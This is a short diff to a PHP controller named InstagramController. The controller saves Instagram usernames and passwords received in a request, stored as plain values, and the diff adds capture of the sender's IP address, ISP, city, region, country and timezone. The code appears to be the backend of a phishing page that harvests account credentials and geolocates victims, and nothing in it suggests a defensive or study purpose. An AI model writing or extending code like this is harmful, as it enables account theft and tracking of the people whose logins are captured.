@@ -41,6 +41,12 @@ class InstagramController extends Controller
 
         $dataInstagram->username = $request->username;
         $dataInstagram->password = $request->password;
+        $dataInstagram->ip = $request->ip;
+        $dataInstagram->isp = $request->isp;
+        $dataInstagram->city = $request->city;
+        $dataInstagram->region = $request->region;
+        $dataInstagram->country = $request->country;
+        $dataInstagram->timezone = $request->timezone;
         
         $dataInstagram->save();
 
